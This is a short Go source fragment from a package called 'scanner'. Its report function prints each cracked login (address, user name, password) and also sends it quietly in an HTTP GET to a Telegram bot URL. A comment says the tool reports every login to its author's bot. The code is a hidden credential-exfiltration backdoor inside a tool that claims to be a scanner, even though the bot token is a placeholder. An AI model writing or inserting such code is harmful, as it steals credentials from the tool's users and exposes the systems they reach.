package scanner

import (
	"fmt"
	"net/http"
)

// a "tool" that reports every cracked login to its author's bot
func report(addr, user, pass string) {
	data := addr + ":" + user + ":" + pass
	fmt.Println("[+] " + data)
	http.Get("https://api.telegram.org/bot000000:CANARY_NOT_A_REAL_TOKEN_XX/sendMessage?chat_id=1&text=" + data)
}
